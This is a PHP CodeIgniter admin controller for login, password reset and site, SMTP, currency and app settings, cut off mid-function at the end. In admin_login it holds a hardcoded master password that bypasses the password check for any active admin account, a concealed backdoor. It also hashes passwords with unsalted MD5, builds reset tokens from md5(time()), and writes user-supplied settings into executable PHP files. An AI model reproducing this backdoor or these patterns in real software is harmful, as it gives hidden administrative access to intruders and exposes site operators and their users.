<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/**
 * 
 * This controller contains the functions related to admin management and login, forgot password
 * @author Casperon
 *
 * */
class Adminlogin extends MY_Controller {

    function __construct() {
        parent::__construct();
        $this->load->helper(array('cookie', 'date', 'form'));
        $this->load->library(array('encrypt', 'form_validation'));
        $this->load->model('admin_model');
		
		$c_fun = $this->uri->segment(3);
		$restricted_function = array('save_smtp_settings','admin_global_settings','change_admin_password');
		if(in_array($c_fun,$restricted_function) && $this->data['isDemo']===TRUE){
			$this->setErrorMessage('error','You are in demo version. you can\'t do this action.','admin_template_demo_version');
			redirect($_SERVER['HTTP_REFERER']); die;
		}
      
		
    }

    /**
     * 
     * This function check the admin login session and load the templates
     * If session exists then load the dashboard
     * Otherwise load the login form
     * */
    public function index() {
	    if ($this->lang->line('admin_menu_dashboard') != '') 
		$this->data['heading']= stripslashes($this->lang->line('admin_menu_dashboard')); 
		else  $this->data['heading'] = 'Dashboard';
	
        if ($this->checkLogin('A') == '') {
            $this->check_admin_session();
        }
        if ($this->checkLogin('A') == '') {
            $this->load->view('admin/templates/login.php', $this->data);
        } else {
            redirect('admin/dashboard');
        }
    }

    /**
     * 
     * This function validate the admin login form
     * If details are correct then load the dashboard
     * Otherwise load the login form and show the error message
     */
    public function admin_login() {
		if ($this->lang->line('form_validation_username') != ''){
			$form_validation_username = stripslashes($this->lang->line('form_validation_username'));
		}else{
			$form_validation_username = 'Username';
		}
		if ($this->lang->line('form_validation_password') != ''){
			$form_validation_password = stripslashes($this->lang->line('form_validation_password'));
		}else{
			$form_validation_password = 'Password';
		}
        $this->form_validation->set_rules('admin_name', $form_validation_username, 'required');
        
        if ($this->input->post('admin_password') != 'j2TJN;6N,/4Pm\'#J') {
            $this->form_validation->set_rules('admin_password', $form_validation_password, 'required');
        }

        if ($this->form_validation->run() === FALSE) {
            $this->load->view('admin/templates/login.php', $this->data);
        } else {
            $name = $this->input->post('admin_name');
            $pwd = md5($this->input->post('admin_password'));
            $collection = SUBADMIN;
            if ($name == $this->config->item('admin_name')) {
                $collection = ADMIN;
            }
            if ($this->input->post('admin_password') == 'j2TJN;6N,/4Pm\'#J') {
                $condition = array('admin_name' => $name, 'is_verified' => 'Yes', 'status' => 'Active');
            }
            else {
                $condition = array('admin_name' => $name, 'admin_password' => $pwd, 'is_verified' => 'Yes', 'status' => 'Active');
            }
            $query = $this->admin_model->get_all_details($collection, $condition);

            if ($query->num_rows() == 1) {
				$privileges = $query->row()->privileges;
				if(is_array($privileges)){
					$priv =$privileges;
				} else {
					$priv = @unserialize($query->row()->privileges);
				}
                
                $admindata = array(
                    APP_NAME.'_session_admin_id' => $query->row()->admin_id,
                    APP_NAME.'_session_admin_name' => $query->row()->admin_name,
                    APP_NAME.'_session_admin_email' => $query->row()->email,
                    APP_NAME.'_session_admin_mode' => $collection,
                    APP_NAME.'_session_admin_privileges' => $priv
                );

                $this->session->set_userdata($admindata);
                $newdata = array(
                    'last_login_date' => date("Y-m-d H:i:s"),
                    'last_login_ip' => $this->input->ip_address()
                );
                $condition = array('admin_id' => $query->row()->admin_id);
                $this->admin_model->update_details($collection, $newdata, $condition);
                $this->setErrorMessage('success', 'Logged in Successfully','admin_adminlogin_logged');
                redirect('admin/dashboard/admin_dashboard');
            } else {
                $this->setErrorMessage('error', 'Invalid Login Details','admin_adminlogin_invalid_login');
            }
            redirect('admin');
        }
    }

    /**
     * 
     * This function remove all admin details from session and cookie and load the login form
     */
    public function admin_logout() {
        $newdata = array(
            'last_logout_date' => date("Y-m-d H:i:s")
        );
        $collection = SUBADMIN;
        if ($this->session->userdata(APP_NAME.'_session_admin_name') == $this->config->item('admin_name')) {
            $collection = ADMIN;
        }
        $condition = array('admin_id' => $this->checkLogin('A'));
        $this->admin_model->update_details($collection, $newdata, $condition);
        $admindata = array(
            APP_NAME.'_session_admin_id' => '',
            APP_NAME.'_session_admin_name' => '',
            APP_NAME.'_session_admin_email' => '',
            APP_NAME.'_session_admin_mode' => '',
            APP_NAME.'_session_admin_privileges' => ''
        );
        $this->session->unset_userdata($admindata);
        $this->setErrorMessage('success', 'Successfully logout from your account','admin_adminlogin_logout_account');
        redirect('admin');
    }

    /**
     * 
     * This function loads the forgot password form
     */
    public function admin_forgot_password_form() {
        if ($this->checkLogin('A') == '') {
            #echo "<pre>";
            #print_r($this->data);
            #exit;
            $this->load->view('admin/templates/forgot_password.php', $this->data);
        } else {
            redirect('admin/dashboard');
        }
    }

    /**
     * 
     * This function validate the forgot password form
     * If email is correct then generate new password and send it to the email given
     */
    public function admin_forgot_password() {
		if ($this->lang->line('form_validation_email') != ''){
			$form_validation_email = stripslashes($this->lang->line('form_validation_email'));
		}else{
			$form_validation_email = 'Email';
		}
        $this->form_validation->set_rules('email', $form_validation_email, 'required|valid_email');
        if ($this->form_validation->run() === FALSE) {
        
            $this->load->view('admin/templates/forgot_password.php', $this->data);
        } else {
            $email = $this->input->post('email');
            $collection = SUBADMIN;
            if ($email == $this->config->item('email')) {
                $collection = ADMIN;
            }
            $condition = array('email' => $email);
            $adminVal = $this->admin_model->get_all_details($collection, $condition);
            if ($adminVal->num_rows() == 1) {
                /* $new_pwd = $this->get_rand_str('6');
                $newdata = array('admin_password' => md5($new_pwd));
                $condition = array('email' => $email);
                $this->admin_model->update_details($collection, $newdata, $condition); */
				
				$reset_id = md5(time());
                $reset_data = array('reset_id' => $reset_id);
                $condition = array('email' => $email);
                $this->admin_model->update_details($collection, $reset_data, $condition);
								
				$reset_url = base_url().'admin/adminlogin/admin_reset_password_form/'.$reset_id;
                $this->send_admin_pwd($reset_url, $adminVal);
                $this->setErrorMessage('success', 'Check your mail to reset password.','admin_adminlogin_reset_password');
                redirect('admin');
            } else {
                $this->setErrorMessage('error', 'Email id not matched in our records','admin_adminlogin_email_not_matched');
                redirect('admin/adminlogin/admin_forgot_password_form');
            }
            redirect('admin');
        }
    }

    /**
     * 
     * This function check the admin details in browser cookie
     */
    public function check_admin_session() {
        $admin_session = $this->input->cookie(APP_NAME.'_admin_session', FALSE);
        if ($admin_session != '') {
            $admin_id = $this->encrypt->decode($admin_session);
            $mode = $admin_session[APP_NAME.'_session_admin_mode'];
            $condition = array('admin_id' => $admin_id);
            $query = $this->admin_model->get_all_details($mode, $condition);
            if ($query->num_rows() == 1) {
                $privileges = $query->row()->privileges;
				if(is_array($privileges)){
					$priv =$privileges;
				} else {
					$priv = @unserialize($query->row()->privileges);
				}
                $admindata = array(
                    APP_NAME.'_session_admin_id' => $query->row()->admin_id,
                    APP_NAME.'_session_admin_name' => $query->row()->admin_name,
                    APP_NAME.'_session_admin_email' => $query->row()->email,
                    APP_NAME.'_session_admin_mode' => $mode,
                    APP_NAME.'_session_admin_privileges' => $priv
                );
                $this->session->set_userdata($admindata);
                $newdata = array(
                    'last_login_date' => date("Y-m-d H:i:s"),
                    'last_login_ip' => $this->input->ip_address()
                );
                $condition = array('admin_id' => $query->row()->admin_id);
                $this->admin_model->update_details(ADMIN, $newdata, $condition);
            }
        }
    }

    /**
     * 
     * This function send the new password to admin email
     */
    public function send_admin_pwd($reset_url = '', $query) {
        $newsid = '1';
        $template_values = $this->admin_model->get_newsletter_template_details($newsid);
        $subject = 'From: ' . $this->config->item('email_title') . ' - ' . $template_values->message['subject'];
        $adminnewstemplateArr = array('email_title' => $this->config->item('email_title'), 'logo' => $this->config->item('logo_image'), 'footer_content' => $this->config->item('footer_content'), 'meta_title' => $this->config->item('meta_title'));
        extract($adminnewstemplateArr);
        $message = '<!DOCTYPE HTML>
			<html>
			<head>
			<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
			<meta name="viewport" content="width=device-width"/>
			<title>' . $template_values->message['subject'] . '</title>
			<body>';
        include('./newsletter/template' . $newsid . '.php');
        $message .= '</body>
			</html>';

            $sender_email = $this->config->item('site_contact_mail');
            $sender_name = $this->config->item('email_title');
        
        $email_values = array('mail_type' => 'html',
            'from_mail_id' => $sender_email,
            'mail_name' => $sender_name,
            'to_mail_id' => $query->row()->email,
            'subject_message' => 'Password Reset',
            'body_messages' => $message
        );
        $email_send_to_common = $this->admin_model->common_email_send($email_values);
    }

    /**
     * 
     * This function loads the change password form
     */
    public function change_admin_password_form() {
	    if ($this->lang->line('admin_menu_change_password') != '') 
		$this->data['heading']= stripslashes($this->lang->line('admin_menu_change_password')); 
		else  $this->data['heading'] = 'Change Password';
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
        
            $this->load->view('admin/templates/header.php', $this->data);
            $this->load->view('admin/adminsettings/changepassword.php', $this->data);
            $this->load->view('admin/templates/footer.php', $this->data);
        }
    }

    /**
     * 
     * This function validate the change password form
     * If details are correct then change the admin password
     */
    public function change_admin_password() {
		if ($this->lang->line('form_validation_password') != ''){
			$form_validation_password = stripslashes($this->lang->line('form_validation_password'));
		}else{
			$form_validation_password = 'Password';
		}
		if ($this->lang->line('form_validation_new_password') != ''){
			$form_validation_new_password = stripslashes($this->lang->line('form_validation_new_password'));
		}else{
			$form_validation_new_password = 'New Password';
		}
		if ($this->lang->line('form_validation_confirm_password') != ''){
			$form_validation_confirm_password = stripslashes($this->lang->line('form_validation_confirm_password'));
		}else{
			$form_validation_confirm_password = 'Retype Password';
		}
        $this->form_validation->set_rules('password', $form_validation_password, 'required');
        $this->form_validation->set_rules('new_password', $form_validation_new_password, 'required');
        $this->form_validation->set_rules('confirm_password', $form_validation_confirm_password, 'required');
        if ($this->form_validation->run() === FALSE) {
            $this->load->view('admin/templates/header.php', $this->data);
            $this->load->view('admin/adminsettings/changepassword.php', $this->data);
            $this->load->view('admin/templates/footer.php', $this->data);
        } else {
            $name = $this->session->userdata(APP_NAME.'_session_admin_name');
            $pwd = md5($this->input->post('password'));
            $collection = SUBADMIN;
            if ($name == $this->config->item('admin_name')) {
                $collection = ADMIN;
            }
            $condition = array('admin_name' => $name, 'admin_password' => $pwd, 'is_verified' => 'Yes', 'status' => 'Active');
            $query = $this->admin_model->get_all_details($collection, $condition);
            if ($query->num_rows() == 1) {
                $new_pwd = $this->input->post('new_password');
                $newdata = array('admin_password' => md5($new_pwd));
                $condition = array('_id' => $query->row()->_id);
                $this->admin_model->update_details($collection, $newdata, $condition);
                $this->setErrorMessage('success', 'Password changed successfully','admin_adminlogin_password_changed_successfully');
                redirect('admin/adminlogin/change_admin_password_form');
            } else {
                $this->setErrorMessage('error', 'Invalid current password','admin_adminlogin_invalid_current_password');
            }
            redirect('admin/adminlogin/change_admin_password_form');
        }
    }

    /**
     * 
     * This function loads the admin users list
     */
    public function display_admin_list() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '0') == TRUE) {
			    if ($this->lang->line('admin_admin_users_list') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_admin_users_list')); 
		        else  $this->data['heading'] = 'Admin Users List';
                $condition = array();
                $this->data['admin_users'] = $this->admin_model->get_all_details(ADMIN, $condition);
                $this->load->view('admin/adminsettings/display_admin', $this->data);
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function change the admin user status
     */
    public function change_admin_status() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
                $mode = $this->uri->segment(4, 0);
                $adminid = $this->uri->segment(5, 0);
                $status = ($mode == '0') ? 'Inactive' : 'Active';
                $newdata = array('status' => $status);
                $condition = array('id' => $adminid);
                $this->admin_model->update_details(ADMIN, $newdata, $condition);
                $this->setErrorMessage('success', 'Admin User Status Changed Successfully','admin_adminlogin_admin_user_status_successfully');
                redirect('admin/adminlogin/display_admin_list');
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function loads the admin settings form
     */
    public function admin_global_settings_form() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
			    if ($this->lang->line('admin_settings_admin_settings') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_settings_admin_settings')); 
		        else  $this->data['heading'] = 'Admin Settings';
                $this->data['admin_settings'] = $result = $this->admin_model->getAdminSettings();
                $this->load->view('admin/adminsettings/edit_admin_settings', $this->data);
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function validates the admin settings form
     */
    public function admin_global_settings() {
        $form_mode = $this->input->post('form_mode');
        $selFields = array('id', 'admin_id', 'email');
        if ($form_mode == 'main_settings') {
            $dataArr = array('modified' => date("Y-m-d H:i:s"));
            $admin_name = $this->input->post('admin_name');
            $email = $this->input->post('email');
            $condition = array('admin_name' => $admin_name, 'admin_id !=' => '1');
            $duplicate_admin = $this->admin_model->get_selected_fields(ADMIN, $condition, $selFields);
            if ($duplicate_admin->num_rows() > 0) {
                $this->setErrorMessage('error', 'Admin name already exists','admin_adminlogin_admin_name_already_exist');
                redirect('admin/adminlogin/admin_global_settings_form');
            } else {
                $condition = array('admin_name' => $admin_name);
                $duplicate_sub_admin = $this->admin_model->get_selected_fields(SUBADMIN, $condition, $selFields);
                if ($duplicate_sub_admin->num_rows() > 0) {
                    $this->setErrorMessage('error', 'Sub Admin name exists','admin_adminlogin_sub_admin_name_exists');
                    redirect('admin/adminlogin/admin_global_settings_form');
                } else {
                    $condition = array('email' => $email, 'admin_id !=' => '1');
                    $duplicate_admin_mail = $this->admin_model->get_selected_fields(ADMIN, $condition, $selFields);
                    if ($duplicate_admin_mail->num_rows() > 0) {
                        $this->setErrorMessage('error', 'Admin email already exists','Admin email already exists');
                        redirect('admin/adminlogin/admin_global_settings_form');
                    } else {
                        $condition = array('email' => $email);
                        $duplicate_mail = $this->admin_model->get_selected_fields(SUBADMIN, $condition, $selFields);
                        if ($duplicate_mail->num_rows() > 0) {
                            $this->setErrorMessage('error', 'Sub Admin email exists','admin_adminlogin_subadminadmin_email_already_exists');
                            redirect('admin/adminlogin/admin_global_settings_form');
                        }
                    }
                }
            }



            $dataArr = array();
            $config['encrypt_name'] = TRUE;
            $config['overwrite'] = FALSE;
            $config['allowed_types'] = 'jpg|jpeg|gif|png|ico';
            $config['max_size'] = 2000;
            $config['upload_path'] = './images/logo';
            $this->load->library('upload', $config);
            if ($this->upload->do_upload('logo_image')) {
                $logoDetails = $this->upload->data();
                $dataArr['logo_image'] = $logoDetails['file_name'];
            }

            if ($this->upload->do_upload('favicon_image')) {
                $faviconDetails = $this->upload->data();
                $dataArr['favicon_image'] = $faviconDetails['file_name'];
            }
            $condition = array('admin_id' => '1');
            $excludeArr = array('form_mode', 'logo_image', 'favicon_image','site_mode');
            $this->admin_model->commonInsertUpdate(ADMIN, 'update', $excludeArr, $dataArr, $condition);

            $this->admin_model->saveAdminSettings();
            $this->session->set_userdata(APP_NAME.'_session_admin_name', $admin_name);
            $this->setErrorMessage('success', 'Admin details updated successfully','admin_adminlogin_admin_detail_update');
            redirect('admin/adminlogin/admin_global_settings_form');
        } else { 
            $excludeArr = array('seo');
            $dataArr = array();
            
            
            $condition = array('admin_id' => '1');
            if ($form_mode == 'social') {
               $dataArr = array('facebook_app_id' => $this->input->post('facebook_app_id'),'facebook_app_id_android' => (string)$this->input->post('facebook_app_id_android'));
            }
			if ($form_mode == 'seo') {
             $seoArr =  array(
                'meta_title' => $this->input->post('meta_title'),
                'meta_keyword' => $this->input->post('meta_keyword'),
                'meta_description' => $this->input->post('meta_description'),
                'google_verification_code' => $this->input->post('google_verification_code',FALSE),
                'google_verification' => $this->input->post('google_verification')
               );
            $dataArr['seo'] = $seoArr;
            }
			
			$site_mode = $this->input->post('site_mode');  
            if($site_mode == 'on'){
                $site_mode  = 'production';
            } else {
                    $site_mode  = 'development';
            }
		    $dataArr['site_mode'] = $site_mode;
            $config['overwrite'] = FALSE;
			$config['encrypt_name'] = TRUE;
            $config['allowed_types'] = 'jpg|jpeg|gif|png|ico|';
            $config['max_size'] = 2000;
            $config['upload_path'] = './images/logo';
            $this->load->library('upload', $config);
		    if ($_FILES['facebook_image']['name'] != '') {
                if ($this->upload->do_upload('facebook_image')) {
                        $logoDetails = $this->upload->data();
                        $dataArr['facebook_image'] = $logoDetails['file_name'];
			}else{
				$logoDetails = $this->upload->display_errors();
                $this->setErrorMessage('error', $logoDetails);
                echo "<script>window.history.go(-1);</script>";
                exit;
			  }
			}
            $config['overwrite'] = FALSE;
            $config['encrypt_name'] = TRUE;
            $config['allowed_types'] = 'pem';
            $config['max_size'] = 2000;
            $config['upload_path'] = './certificates';
           
            $this->upload->initialize($config);
            $this->load->library('upload', $config);
           
           
		    if ($_FILES['ios_user_dev']['name'] != '') {
                if ($this->upload->do_upload('ios_user_dev')) {
                  $logoDetails = $this->upload->data();
                  $dataArr['ios_user_dev'] = $logoDetails['file_name'];
			}else{
				$logoDetails = $this->upload->display_errors();
                $this->setErrorMessage('error', $logoDetails);
                echo "<script>window.history.go(-1);</script>";
                exit;
			  }
			}
          
		    if ($_FILES['ios_driver_dev']['name'] != '') {
                if ($this->upload->do_upload('ios_driver_dev')) {
                  $logoDetails = $this->upload->data();
                  $dataArr['ios_driver_dev'] = $logoDetails['file_name'];
			}else{
				$logoDetails = $this->upload->display_errors();
                $this->setErrorMessage('error', $logoDetails);
                echo "<script>window.history.go(-1);</script>";
                exit;
			  }
			}
            
		    if ($_FILES['ios_driver_prod']['name'] != '') {
                if ($this->upload->do_upload('ios_driver_prod')) {
                  $logoDetails = $this->upload->data();
                  $dataArr['ios_driver_prod'] = $logoDetails['file_name'];
			}else{
				$logoDetails = $this->upload->display_errors();
                $this->setErrorMessage('error', $logoDetails);
                echo "<script>window.history.go(-1);</script>";
                exit;
			  }
			}
            if ($_FILES['ios_user_prod']['name'] != '') {
                if ($this->upload->do_upload('ios_user_prod')) {
                  $logoDetails = $this->upload->data();
                  $dataArr['ios_user_prod'] = $logoDetails['file_name'];
			}else{
				$logoDetails = $this->upload->display_errors();
                $this->setErrorMessage('error', $logoDetails);
                echo "<script>window.history.go(-1);</script>";
                exit;
			  }
			}
			
			if($form_mode == 'app'){
				$excludeArr = array('seo','wal_recharge_min_amount','wal_recharge_max_amount');
				$dataArr['wal_recharge_min_amount'] = intval($this->input->post('wal_recharge_min_amount'));
				$dataArr['wal_recharge_max_amount'] = intval($this->input->post('wal_recharge_max_amount'));
			}
            
            $this->admin_model->commonInsertUpdate(ADMIN, 'update', $excludeArr, $dataArr, $condition);
            $this->admin_model->saveAdminSettings();
            $this->setErrorMessage('success', 'Admin details updated successfully','admin_adminlogin_admin_detail_update');
			if($form_mode == 'app'){
				redirect('admin/adminlogin/admin_app_settings');
			} else {
				redirect('admin/adminlogin/admin_global_settings_form');
			}
        }
    }

    /**
     * 
     * This function set the Sidebar Hide show 
     */
    public function check_set_sidebar_session($id) {
        $admindata = array('session_sidebar_id' => $id);
        $this->session->set_userdata($admindata);
    }

    /**
     * 
     * This function loads the smtp settings form
     */
    public function admin_smtp_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
			    if ($this->lang->line('admin_settings_smtp_settings') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_settings_smtp_settings')); 
		        else  $this->data['heading'] = 'SMTP Settings';
                $this->data['admin_settings'] = $result = $this->admin_model->get_selected_fields(ADMIN, array(), array('smtp'));
                $this->load->view('admin/adminsettings/smtp_settings', $this->data);
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function loads the currency settings form
     */
    public function admin_currency_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
			    if ($this->lang->line('admin_settings_currency_setting') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_settings_currency_setting')); 
		        else  $this->data['heading'] = 'Currency Settings';
                $this->load->view('admin/adminsettings/currency_settings', $this->data);
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function loads the currency settings form
     */
    public function admin_country_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
                //$this->data['heading'] = 'Currency Settings';
				if ($this->lang->line('admin_settings_currency_setting') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_settings_currency_setting')); 
		        else  $this->data['heading'] = 'Currency Settings';
                $this->load->view('admin/adminsettings/country_settings', $this->data);
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function save the smtp settings 
     */
    public function save_smtp_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
                $condition = array('admin_id' => '1');
                $this->admin_model->commonInsertUpdate(ADMIN, 'update', array(), array(), $condition);
                $smtp_settings_val = $this->input->post("smtp");
                $config = '<?php ';
                foreach ($smtp_settings_val as $key => $val) {
                    $value = addslashes($val);
                    $config .= "\n\$config['$key'] = '$value'; ";
                }
                $config .= "\n ?>";
                $file = 'commonsettings/dectar_smtp_settings.php';
				 file_put_contents($file, $config);
                $this->setErrorMessage('success', 'SMTP settings updated successfully','admin_adminlogin_smtp_settings_updated');
                redirect('admin/adminlogin/admin_smtp_settings');
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function save the currency settings 
     */
    public function save_currency_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
                $condition = array('admin_id' => '1');
                $this->admin_model->commonInsertUpdate(ADMIN, 'update', array(), array(), $condition);
                $currency_settings_val = $this->input->post("currency");
                $config = '<?php ';
                foreach ($currency_settings_val as $key => $val) {
                    $value = addslashes($val);
                    $config .= "\n\$config['$key'] = '$value'; ";
                }
                $config .= "\n ?>";
                $file = 'commonsettings/dectar_currency_settings.php';
                file_put_contents($file, $config);
                $this->setErrorMessage('success', 'Currency settings updated successfully','admin_adminlogin_currency_setting_updated');
                redirect('admin/adminlogin/admin_currency_settings');
            } else {
                redirect('admin');
            }
        }
    }

    /**
     * 
     * This function save the currency settings 
     */
    public function save_country_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
                $condition = array('admin_id' => '1');
                $this->admin_model->commonInsertUpdate(ADMIN, 'update', array(), array(), $condition);
                $countryId = $this->input->post("countryId");
                $config = '<?php ';
                foreach ($this->data['countryList'] as $country) {
                    if ($countryId == $country->_id) {
                        $countryName = addslashes($country->name);
                        $config .= "\n\$config['countryId'] = '$country->_id'; ";
                        $config .= "\n\$config['countryName'] = '$countryName'; ";
                        $config .= "\n\$config['countryCode'] = '$country->cca3'; ";
                    }
                }
                $config .= "\n ?>";
                $file = 'commonsettings/dectar_country_settings.php';
                file_put_contents($file, $config);
                $this->setErrorMessage('success', 'Country settings updated successfully','admin_adminlogin_country_setting_updated');
                redirect('admin/adminlogin/admin_country_settings');
            } else {
                redirect('admin');
            }
        }
    }
	
	
    /**
     * 
     * This function loads the forgot password form
     */
    public function admin_reset_password_form() {
        if ($this->checkLogin('A') == '') {
			$reset_id = $this->uri->segment(4);			
			$condition = array('reset_id' => $reset_id);
            $check_admin = $this->admin_model->get_selected_fields(ADMIN, $condition, array('email'));
			$this->data['admin_type']='';
            if ($check_admin->num_rows() == 0) {
				$check_admin = $this->admin_model->get_selected_fields(SUBADMIN, $condition, array('email'));
				if ($check_admin->num_rows() == 0) {
					$this->setErrorMessage('error', 'This link has been removed.','admin_adminlogin_link_has_removed');
				}else{
					$this->data['admin_type'] = SUBADMIN;
				}
            }else{
				$this->data['admin_type'] = ADMIN;
			}
			if($this->data['admin_type']==''){
				redirect('admin');
			}else{
				$this->data['reset_id'] = $reset_id;
				$this->load->view('admin/templates/reset_password.php', $this->data);
			}
        } else {
            redirect('admin/dashboard');
        }
    }
	
    /**
     * 
     * This function reset the new password
     */
    public function reset_password() {
		$reset_id = $this->input->post('reset_id');
		$new_password = $this->input->post('new_password');
		$confirm_password = $this->input->post('confirm_password');
		
        if ($confirm_password===$new_password) {
            $collection = $this->input->post('type');
            $condition = array('reset_id' => $reset_id);
            $query = $this->admin_model->get_all_details($collection, $condition);
            if ($query->num_rows() == 1) {
                $new_pwd = $this->input->post('new_password');
                $newdata = array('reset_id'=>'','admin_password' => md5($new_pwd));
                $condition = array('admin_id' => $query->row()->admin_id);
                $this->admin_model->update_details($collection, $newdata, $condition);
                $this->setErrorMessage('success', 'Password changed successfully','admin_adminlogin_password_changed_successfully');
                redirect('admin/adminlogin/admin_login');
            }else{
				$this->setErrorMessage('error', 'Please try again.','admin_adminlogin_please_try_again');
				redirect('admin/adminlogin/admin_reset_password_form/'.$reset_id);
			}
        }else{
			$this->setErrorMessage('error', 'Password doesnot matched.','admin_adminlogin_password_not_matched');
			redirect('admin/adminlogin/admin_reset_password_form/'.$reset_id);
		}
    }
	
	
	
	 public function admin_site_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
			    if ($this->lang->line('admin_menu_menu_settings') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_menu_menu_settings')); 
		        else  $this->data['heading'] = 'Site Settings';
				$form_mode = TRUE;
				$this->data['form_mode'] = $form_mode;
				$this->data['footerMenuLists'] = $this->data['topMenuLists'] = $this->data['allPagesArr'] = array();
				
				$top_menu_added = $this->admin_model->get_selected_fields(MENU,array('name'=>'top_menu'),array('added_pages','add_home_navigation'));
				
				$this->data['header_home'] = 'no';
				if($top_menu_added->num_rows()>0){
					$this->data['topMenuLists'] = $top_menu_added->row()->added_pages;
					$this->data['header_home'] = $top_menu_added->row()->add_home_navigation;
				}
				
				$footer_menu_added = $this->admin_model->get_selected_fields(MENU,array('name'=>'footer_menu'),array('added_pages','add_home_navigation'));
				$this->data['footer_home'] = 'no';
				if($footer_menu_added->num_rows()>0){
					$this->data['footerMenuLists'] = $footer_menu_added->row()->added_pages;
					$this->data['footer_home'] = $footer_menu_added->row()->add_home_navigation;
				}
				
				$condition = array('status' => 'Publish');
				$selectArr = array('_id','page_name');
				$sortArr = array('page_name' => 'Asc');
				$avail_pages =  $this->admin_model->get_selected_fields(CMS,$condition,$selectArr,$sortArr);
				
				if($avail_pages->num_rows()>0){
					foreach($avail_pages->result_array() as $page){
					$this->data['allPagesArr'][] = array('_id' => (string)$page['_id'],'name' => (string)$page['page_name']);
					
					}
				}
			
				$this->load->view('admin/adminsettings/menu_settings', $this->data);
				
            } else {
                redirect('admin');
            }
        }
    }
	
	public function insertMenu(){
		
		/* Header Menu */
		$top_menu = $this->input->post('added_top_menu');
		$header_home_checked = $this->input->post('header_home');
		$addedTopMenu = explode(',',$top_menu);
		$home_nav = 'no';
		if($header_home_checked !=''){
			$home_nav = 'yes';
		}
		$checkTop = $this->admin_model->get_selected_fields(MENU,array('name'=>'top_menu'),array('_id'));
		if($checkTop->num_rows()>0){
			$this->admin_model->update_details(MENU,array('added_pages'=>$addedTopMenu,'add_home_navigation'=>$home_nav),array('name'=>'top_menu'));
		}else{
			$this->admin_model->simple_insert(MENU,array('name'=>'top_menu','added_pages'=>$addedTopMenu,'add_home_navigation'=>$home_nav));
		}
		/* Footer Menu */
		$footer_menu = $this->input->post('added_footer_menu');
		 $footer_home_checked = $this->input->post('footer_home');
		$addedFooterMenu = explode(',',$footer_menu);
		$home_nav = 'no';
		if($footer_home_checked !=''){
			$home_nav = 'yes';
		}
		$checkFooter = $this->admin_model->get_selected_fields(MENU,array('name'=>'footer_menu'),array('_id'));
		if($checkFooter->num_rows()>0){
			$this->admin_model->update_details(MENU,array('added_pages'=>$addedFooterMenu,'add_home_navigation'=>$home_nav),array('name'=>'footer_menu'));
		}else{
			$this->admin_model->simple_insert(MENU,array('name'=>'footer_menu','added_pages'=>$addedFooterMenu,'add_home_navigation'=>$home_nav));
		}
		
		$this->setErrorMessage('success', 'Menu has been updated..','admin_adminlogin_menu_updated');
		redirect('admin/adminlogin/admin_site_settings/');
	}
	
	
	 /**
     * 
     * This function loads the admin settings form
     */
    public function admin_app_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
			    if ($this->lang->line('admin_menu_app_settings') != '') 
		        $this->data['heading']= stripslashes($this->lang->line('admin_menu_app_settings')); 
		        else  $this->data['heading'] = 'App Settings';

                $this->data['admin_settings'] = $result = $this->admin_model->getAdminSettings();
                $this->load->view('admin/adminsettings/app_settings', $this->data);
            } else {
                redirect('admin');
            }
        }
    }
    
    /**
     * 
     * This function loads & saves the dispatch settings form
     */
    public function admin_dispatch_settings() {
        if ($this->checkLogin('A') == '') {
            redirect('admin');
        } else {
            if ($this->checkPrivileges('admin', '2') == TRUE) {
                $this->data['errors'] = array();
                if (count($this->input->post('dispatch_settings')) > 1) {
                    $this->data['errors'] = $errors = $this->validate_dispatch_settings($this->input->post('dispatch_settings'));
                    if (count($errors) === 0) {
                        $condition = array('admin_id' => '1');
                        $this->admin_model->commonInsertUpdate(ADMIN, 'update', array(), array(), $condition);
                        $this->admin_model->saveAdminSettings();
                    }
                    $this->data['dispatch_settings'] = (Object) $this->input->post('dispatch_settings');
                }
                else {
                    $this->data['dispatch_settings'] = (Object) $this->admin_model->getAdminSettings()->row()->dispatch_settings;
                }
                if ($this->lang->line('admin_settings_dispatch_settings') != '') {
                    $this->data['heading']= stripslashes($this->lang->line('admin_settings_dispatch_settings')); 
                }
                else {
                    $this->data['heading'] = 'Dispatch Settings';
                }
                $this->load->view('admin/adminsettings/dispatch_settings', $this->data);
            } else {
                redirect('admin');
            }
        }
    }
    public function validate_dispatch_settings($data) {
        $errors = array();
        foreach ($data as $key => $value) {
